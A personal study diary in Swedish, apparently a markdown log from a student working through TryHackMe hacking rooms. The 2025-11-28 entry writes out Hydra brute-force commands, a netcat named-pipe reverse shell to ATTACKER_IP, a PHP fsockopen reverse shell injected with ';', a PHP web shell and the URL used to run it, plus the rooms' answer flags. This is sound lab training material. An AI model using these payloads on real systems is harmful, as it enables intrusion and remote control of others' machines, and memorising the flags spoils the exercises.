# 2025-11-28
De har ändrat om i ordningen i Cyber101, så OWASP har fått ett nytt rum för 2025 och det rummet är placerat i slutet av Cyber101 om jag förstått det rätt. Vilket passar mig bra. Nu börjar det vara dags att göra om Burp Suite!

Jag läste om BURP Suite Basics-rummet och tyvärr är det ju väldigt fattigt på praktiska övningar. Och jag tycker det är svårare att faktiskt absorbera informationen när man bara läser om den teoretiskt, jag vill gärna känna och klämma på program för att faktiskt förstå kopplingarna. Men det kommer nog framöver.

## Nu blir det Hydra istället. <br>
För att lösa uppgiften så kör vi följande kommando: <br>
<code>hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.82.129.7 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V</code> <br>
Svaret jag fick: [80][http-post-form] host: 10.82.129.7   login: molly   password: sunshine <br>
Med det så loggar jag in via Firefox och hittar flaggan: <br>

THM{2673a7dd116de68e85c48ec0b1f2612e} <br><br>

Nu ska vi lösa SSH-login. <br>
<code>hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.82.129.7 ssh</code> <br>
Svaret jag fick: [22][ssh] host: 10.82.129.7   login: molly   password: butterfly <br>
Med det loggar jag in via SSH och hittar flaggan: <bR>

THM{c8eeb0468febbadea859baeb33b2541b} <br>


![Hydra basics](<bilder/Skärmbild 2025-11-27 hydra basics.png>) <br><br>

## GoBuster Basics. 

Jag är redan ganska bekant med gobuster då jag använt det en del i CTF:er. <br>

Nedan är kod jag använde för att enumerate:a mig fram genom uppgiften. <br>
<code>gobuster dir -u www.offensivetools.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code> <br>
Efter det så fick vi instruktionen att leta efter en javascript-fil i den "intressanta" katalogen vi hittade, så koden blir: <br>
<code>gobuster dir -u www.offensivetools.thm/secret/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .js</code> <br>
Nu är det bara att ta hem flaggan med det vi hittat med följande: <br>
<code>curl www.offensivetools.thm/secret/flag.js</code><br><br>
THM{ReconWasASuccess}
<br><br>
Nu är det dags att kolla hur många subdomäner vi har på adressen. <br>
<code>gobuster dns -d offensivetools.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code><br>
Och vi hittade 4 stycken. <br><br>
För att titta på vhosts så krävdes ett mer avancerat kommando: <br>
<code>gobuster vhost -u "http://10.80.132.244" --domain offensivetools.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-500</code><br>
Men vi fick 5 svar. Varav 2 var samma, så svaret på frågan blev 4. <br>

![Gobuster basics](<bilder/Skärmbild 2025-11-28 gobuster basics.png>)

## Shells Overview

Väldigt intressant att sätta upp ett reverse shell genom två maskiner. Som attackerare så startar jag först upp netcat för att lyssna på mitt reverse shell: <br>
<code>nv -lvnp PORT</code><br>
Sedan kör jag följande kommando på maskinen jag ska attackera, dvs köra igång ett pipe reverse shell från: <br>
<code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f</code><br>
Lite kryptisk kod, men det fungerar och här har jag en förklaring från TryHackMe: <br>

<b>rm -f /tmp/f</b> - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.

<b>mkfifo /tmp/f</b> - This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.

<b>cat /tmp/f</b> - This command reads data from the named pipe. It waits for input that can be sent through the pipe.

<b>| bash -i 2>&1</b> - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute 
commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.

<b>| nc ATTACKER_IP ATTACKER_PORT </b>>/tmp/f - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT). <br>

<b>\>/tmp/f</b> -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

Rummet går också genom bind shells och shell listeners, bland shell listeners har vi rlwrap, ncat och socat.<br><br>
Senare behöver jag applicera min kunskap, det blev lite testa sig fram och tillbaka men det slutade med: <br>
<code>;php -r '$sock=fsockopen("10.82.95.146",4444);shell_exec("sh <&3 >&3 2>&3");';</code> i uppgift 1. <br>
Och efter lite navigering så hittade vi till slut flaggan: <br>
THM{0f28b3e1b00becf15d01a1151baf10fd713bc625} <br><br>
Nu skulle vi köra en annan typ av reverse shell som inte fungerade med kodinjektion utan vi ska ladda upp en fil. <br>
Jag blev tvungen att skapa en shell.php-fil enligt en tidigare avdelning i rummet, innehållet såg ut såhär: <br>
<code>\<?php
if (isset($_GET['cmd'])) {<br>
    system($_GET['cmd']);<br>
}<br>
?></code><br>

Tydligen kan man köra flera kommandon på rad om man separerar dem med ";", så det blir den vägen vi kör.<br>
Så det jag fick lägga in i adressfältet blev följande: <br>
"http://10.80.147.103:8082/uploads/shell.php?cmd=cd%20..;cd%20..;%20cd%20..;%20cd%20..;cat%20flag.txt"<br>

Med det fick jag fram flaggan: <br>
THM{202bb14ed12120b31300cfbbbdd35998786b44e5} <br><br>

![Shells overview](<bilder/Skärmbild 2025-11-28 shells overview.png>)

# 2025-11-23
Jag har senaste tiden gått genom några olika rum, men det har blivit lite här och lite där så jag skrev inte upp så mycket på vägen. Så jag tänkte gå genom mina framsteg nu i efterhand istället. <br>
Det har varit web hacking i fokus senaste tiden och såhär ser det ut just nu:

![Just nu](<bilder/Skärmbild 2025-11-23 web hacking.png>)

---
<br>

![Web Application Basics](<bilder/Skärmbild 2025-11-13 web application .png>)

Vi går i kronologisk ordning så vi börjar med the basics. <br>
Inte så mycket nytt för mig här, vi går genom HTML, CSS och JS. Rummet pratar om Databases, Infrastructure och WAF. Med Infrastructure så syftas det på servrar, applikationsservrar, storage osv. WAF betyder Web Application Firewall.

Intressanta delar här för mig var: <br>
HTTP Messages, dvs HTTP Request och HTTP Response. Saker jag än inte riktigt förstår men som de försöker förklara är hur dessa är uppbyggda och används i HTTP-trafik. Jag hittade nedanstående bilder på nätet som hjälper litegrann: <br>
![HTTP Request](bilder/http_requestmessageexample.png)<br>
![HTTP Response](bilder/http_responsemessageexample.png)<br>

Mer intressant är väl de vanliga status-koderna som t.ex.: <br>
200 - Success <br>
300 - Redirect <br>
400 - Client Error (not found) <br>
500 - Server Error <br>

---
<br>

![Java Script Essentials](<bilder/Skärmbild 2025-11-13 JavaScript essentials.png>) <br>

Rummet börjar med att gå genom lite grundläggande programmering och förklarar vad en variabel, funktioner och loopar är. Vi får sedan prova på att koda i javascript i en webbläsares konsoll. Det var lite kul! <br>
Sedan får man se hur man kan integrera javascript-kod i html, antingen internal eller external. Och till slut så går vi genom minified files. Vilket var ett nytt koncept för mig. Det här kommer nog komma till användning i CTF-sammanhang i framtiden.
<br>

---
<br>

![SQL Fundamentals](<bilder/Skärmbild 2025-11-14 SQL fundamentals.png>) <br>
Jag har gått en kurs om databaser så jag var ganska bekant med det mesta i det här rummet. Specifikt språket i SQL är jag ganska bekant med, det tog inte så länge innan jag kom in i det igen. <br>

---
<br>

Jag glömde ta en screnshot av BURP Suite Basics, och det var nog lika bra. För jag har använt mig lite av BURP Suite i CTF-sammanhang och jag känner mig fortfarande ganska vilse. Med andra ord bör jag nog starta om det här rummet och köra genom det med mer uppmärksamhet, så det är min plan. Jag kommer eventuellt även starta om OWASP Top 10 2021 då jag tyckte flera aspekter där var väldigt intressanta men man fick en kortare genomgång vilket gör att det kan repeteras känner jag.

# 2025-11-09
https://tryhackme.com/room/meterpreter <br>
Sådär. Då blev jag klar med Metasploit. Riktigt roliga rum. Jag har i vanlig ordning missförstått och läst fel på ett par ställen så man fick slita sig i håret något och testa sig fram med olika grejer innan jag insett att jag gjort fel och att då var svaret relativt enkelt. Men jag tror det bara har gett mig lite mer erfarenhet med att knappa runt inom metasploit framework. Mot slutet kändes det riktigt naturligt att söka fram en modul och ladda den med nödvändiga options-alternativ.<br><br>
![Meterpreter avklarad](<bilder/Skärmbild 2025-11-09 metasploit meterpreter.png>)
![Badge och total progress](<bilder/Skärmbild 2025-11-09 rank level badge.png>)<br><br>
https://tryhackme.com/room/blue <br>
Nu ska jag attackera rummet Blue och bara av att öppna det så ser det riktigt spännande ut.<br><br>
Det var det också. Jag blev just klar, riktigt kul att få gå genom hela processen från början till slutet. Ganska enkelt att hänga med hela vägen efter alla instruktioner. Jag såg att det rekommenderades att testa "Ice" efteråt. Så det rummet ska nog testas rätt snart också. Men det här får nog räcka för idag.<br><br>
![Blue completed](<bilder/Skärmbild 2025-11-09 Blue badge.png>)<br><br>
https://tryhackme.com/room/ice <br>
Jag kanske tog lite mer tid idag för att fortsätta. Men rummet tog nog bara 30-45 minuter.<br>
Rummet ICE var lika roligt som rummet Blue. Tydliga och enkla instruktioner, men fick använda mig av några andra knep denna gång. Modulen 'post/multi/recon/local_exploit_suggester' var en jag verkligen gillar då jag tidigare funderat hur man ska hålla reda på alla relevanta exploits man ska använda vid olika typer av maskiner man ska attackera. Det här underlättar ju en hel del.<br>
Sedan var det kul att testa den nyare versionen av mimikatz, dvs kiwi. Väldigt kraftfullt verktyg. Men rummet antydde att en anledning till varför det är så enkelt är att maskinen i fråga hade avstängd brandvägg och inte igång Windows defender. En mer modern maskin är nog inte lika enkel.<br>
![ICE complete](<bilder/Skärmbild 2025-11-09 ICE badge.png>)


# 2025-11-08
https://tryhackme.com/room/metasploitexploitation <br>
Verkar som jag försöker köra minst en varje dag nu, får se om det håller i sig.
![Metasploitable exploitation](<bilder/Skärmbild 2025-11-08 metasploit exploitation.png>)

# 2025-11-07
https://tryhackme.com/room/metasploitintro <br>
Körde vidare lite lätt idag.
![Metasploitable intro](<bilder/Skärmbild 2025-11-07 metasploit intro.png>)

# 2025-11-06
Testar att starta en liten dagbok för detta.<br><br>
![Legacy](<bilder/Skärmbild 2025-11-06 110625.png>)<br>
De har just pensionerat gamla SOC Level 1, tur jag inte hann klart den.<br><br>
![Progress](<bilder/Skärmbild 2025-11-06 105632.png>)<br><br>
Dags att ta tag i exploitation basics!